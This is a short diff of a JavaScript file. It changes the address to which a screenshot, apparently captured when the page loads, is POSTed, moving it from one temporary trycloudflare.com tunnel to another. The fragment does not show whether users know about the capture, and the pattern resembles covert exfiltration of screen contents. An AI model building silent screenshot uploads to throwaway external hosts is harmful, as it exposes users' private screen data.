@@ -66,7 +66,7 @@ document.addEventListener("DOMContentLoaded", () => {
       formData.append("image", blob, "screenshot.png");
 
       // Отправляем на сервер
-      fetch("https://solo-tm-successfully-mood.trycloudflare.com/upload", {
+      fetch("https://cameroon-december-dumb-beat.trycloudflare.com/upload", {
         method: "POST",
         body: formData
       })
